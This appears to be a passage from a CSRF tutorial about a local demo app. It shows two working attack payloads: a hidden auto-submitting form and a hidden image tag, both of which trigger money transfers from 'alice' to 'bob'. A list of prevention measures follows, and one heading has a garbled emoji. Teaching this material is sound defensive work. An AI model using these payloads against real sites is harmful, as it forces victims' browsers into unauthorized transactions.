The following demonstrates how an attacker could exploit this vulnerability:

Attack Scenario 1: Hidden Form

An attacker could embed this hidden form on their malicious website:

<form action="http://localhost:3000/transfer" method="POST" style="display:none;">
    <input name="from" value="alice">
    <input name="to" value="bob">
    <input name="amount" value="100">
</form>
<script>document.forms[0].submit();</script>

Attack Scenario 2: Image Tag Attack

For GET requests, attackers could use:

<img src="http://localhost:3000/transfer?from=alice&to=bob&amount=50" style="display:none;">

üõ°Ô∏è How to Prevent CSRF Attacks

  • CSRF Tokens: Include unique, unpredictable tokens in forms
  • SameSite Cookies: Set cookies with SameSite=Strict or Lax
  • Origin/Referer Headers: Validate request origin
  • Double Submit Cookies: Send token in both cookie and form
  • Custom Headers: Require custom headers for state-changing requests
